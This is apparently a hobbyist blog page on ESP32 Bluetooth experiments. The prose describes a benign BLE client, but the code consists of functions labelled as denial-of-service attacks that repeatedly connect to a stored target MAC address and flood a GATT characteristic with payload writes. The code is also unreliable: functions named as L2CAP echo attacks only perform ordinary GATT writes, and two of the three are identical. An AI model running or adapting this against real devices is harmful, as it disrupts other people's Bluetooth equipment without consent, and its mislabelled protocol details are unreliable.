---
layout: page
title: ESP32 - Bluetooth Attacks
published: 2026-09-27
description: "BLE - Experiments"
permalink: /arduino/esp8266/websocket_ble_exp
category: esp32
subcategory: ble
---
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src 'self' https:; script-src 'self'; style-src 'self' 'unsafe-inline';">
<meta http-equiv="X-Content-Type-Options" content="nosniff">
<meta http-equiv="Strict-Transport-Security" content="max-age=31536000; includeSubDomains; preload">
<meta name="referrer" content="no-referrer">
<meta http-equiv="X-Frame-Options" content="DENY">
<meta http-equiv="Permissions-Policy" content="geolocation=(), microphone=(), camera=()">
<meta http-equiv="X-XSS-Protection" content="1; mode=block">
<meta http-equiv="Access-Control-Allow-Origin" content="*">
<meta http-equiv="Cross-Origin-Embedder-Policy" content="require-corp">
<meta http-equiv="Cross-Origin-Opener-Policy" content="same-origin">
<meta http-equiv="Cross-Origin-Resource-Policy" content="same-origin">
<meta http-equiv="Expect-CT" content="max-age=86400, enforce">

<link rel="icon" href="/favicon.png" type="image/png">
<link rel="stylesheet" href="{{ 'css/main.css' | relative_url }}">
<script src="{{ 'assets/js/copy-to-clipboard.js' | relative_url }}"></script>

---

<h1>ESP32 BLE Client Experiments</h1>

<p>
This project explores BLE client functionality on the ESP32 using the Arduino BLE library. It focuses on establishing connections to nearby Bluetooth Low Energy devices, discovering services and characteristics, exchanging data, and managing connection lifecycles. The code served as an experimental platform for understanding BLE communication and testing interactions with compatible devices.
</p>

<h1>Features</h1>

<ul>
    <li>BLE client initialization and connection management.</li>
    <li>Discovery of remote BLE services and characteristics.</li>
    <li>Read and write operations against GATT characteristics.</li>
    <li>Automatic connection and disconnection handling.</li>
    <li>Configurable target device selection using a stored Bluetooth address.</li>
    <li>Reusable framework for BLE communication experiments.</li>
</ul>

<h1>Reusable Components</h1>

<p>
The project contains reusable code for creating BLE clients, connecting to remote devices, discovering GATT services, accessing characteristics, exchanging data, and properly managing connection state. These components can be adapted for projects involving BLE sensors, IoT devices, home automation, or custom Bluetooth peripherals.
</p>

<h1>Future Improvements</h1>

<p>
Future revisions could add automatic device discovery, configurable service selection, improved error handling, encrypted communication where supported, asynchronous connection management, and a modular architecture for supporting multiple BLE device profiles.
</p>

```bash
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>
#include <BLEClient.h>

const char* serviceUUID = "00001801-0000-1000-8000-00805f9b34fb";
const char* characteristicUUID = "00002A00-0000-1000-8000-00805f9b34fb";

String stored_bluetooth_mac = "";

void bleL2CAPEchoDoS() {
    if (stored_bluetooth_mac.length() == 0) return;

    BLEClient* pClient = BLEDevice::createClient();
    uint8_t data[16] = {0x00}; // payload

    for (int i = 0; i < 500; i++) {
        if (!pClient->isConnected()) {
            pClient->connect(BLEAddress(stored_bluetooth_mac.c_str()));
        }

        BLERemoteService* pService = pClient->getService(BLEUUID(serviceUUID));
        if (pService != nullptr) {
            BLERemoteCharacteristic* pChar = pService->getCharacteristic(BLEUUID(characteristicUUID));
            if (pChar != nullptr) {
                pChar->writeValue(data, sizeof(data));
            }
        }

        delay(20);
    }

    if (pClient->isConnected()) {
        pClient->disconnect();
    }
}

void bleL2CAPEchoConnectionRequestDoS() {
    if (stored_bluetooth_mac.length() == 0) return;

    BLEClient* pClient = BLEDevice::createClient();
    uint8_t data[16] = {0x02, 0x00, 0x06, 0x01, 0x00, 0x01, 0x00};

    for (int i = 0; i < 500; i++) {
        if (!pClient->isConnected()) {
            pClient->connect(BLEAddress(stored_bluetooth_mac.c_str()));
        }

        BLERemoteService* pService = pClient->getService(BLEUUID(serviceUUID));
        if (pService != nullptr) {
            BLERemoteCharacteristic* pChar = pService->getCharacteristic(BLEUUID(characteristicUUID));
            if (pChar != nullptr) {
                pChar->writeValue(data, sizeof(data));
            }
        }

        delay(20);
    }

    if (pClient->isConnected()) {
        pClient->disconnect();
    }
}

void bleL2CAPEchoResetDoS() {
    if (stored_bluetooth_mac.length() == 0) return;

    BLEClient* pClient = BLEDevice::createClient();
    uint8_t data[16] = {0x02, 0x00, 0x06, 0x01, 0x00, 0x01, 0x00};

    for (int i = 0; i < 500; i++) {
        if (!pClient->isConnected()) {
            pClient->connect(BLEAddress(stored_bluetooth_mac.c_str()));
        }

        BLERemoteService* pService = pClient->getService(BLEUUID(serviceUUID));
        if (pService != nullptr) {
            BLERemoteCharacteristic* pChar = pService->getCharacteristic(BLEUUID(characteristicUUID));
            if (pChar != nullptr) {
                pChar->writeValue(data, sizeof(data));
            }
        }

        delay(20);
    }

    if (pClient->isConnected()) {
        pClient->disconnect();
    }
}

```


---

<style>
  footer {
    display: none;
  }
</style>